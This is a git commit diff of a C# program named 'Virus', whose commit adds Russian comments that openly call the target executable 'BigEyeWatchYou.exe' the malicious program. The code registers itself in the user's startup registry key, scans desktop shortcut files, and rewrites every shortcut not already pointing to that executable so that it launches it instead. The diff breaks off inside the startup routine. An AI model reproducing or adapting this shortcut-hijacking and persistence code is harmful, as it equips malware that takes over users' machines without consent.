38cf0906d6013801390227887463ca131a6bc1be
Artem Momatov <momatovv@list.ru>
2023-10-11 22:49:04 +0300

    Added comments

--- Virus/Program.cs
+++ Virus/Program.cs
@@ -18,25 +18,43 @@ namespace Virus
         static void Main(string[] args)
         {
             SetStartup();
-            var folder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
-            var files = LnkHelper.GetAllShortcutsFiles(folder);
+
+            // Получение пути к рабочему столу
+            var desktopFolder = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+
+            // Получение файлов ярлыков
+            var files = LnkHelper.GetAllShortcutsFiles(desktopFolder);
+
+            // Получение абсолютного пути к вредоносной программе
             var targetPath = Path.GetFullPath("BigEyeWatchYou.exe");
 
             foreach (var file in files)
             {
+
+                // Получем путь, который щас указан в ярлык
+                // Если он не содержит путь к нашей вредоносной программе, то меняем
                 var path = LnkHelper.GetShellLinkPath(file.FullName);
                 if (!path.Contains("BigEyeWatchYou.exe"))
                 {
-                    LnkHelper.ChangeShortcut(file.FullName, targetPath, QuotedMarked(Path.GetFileNameWithoutExtension(file.Name)));
+                    LnkHelper.ChangeShortcut(file.FullName, targetPath,
+                        QuotedMarked(Path.GetFileNameWithoutExtension(file.Name)));
                 }
             }
         }
 
+        /// <summary>
+        /// Оборачивает строку в двойные кавычки
+        /// </summary>
+        /// <param name="value"></param>
+        /// <returns></returns>
         private static string QuotedMarked(string value)
         {
             return $"\"{value}\"";
         }
 
+        /// <summary>
+        /// Добавляет приложение в автозагрузку, если его там нет
+        /// </summary>
         private static void SetStartup()
         {
             RegistryKey rk = Registry.CurrentUser.OpenSubKey
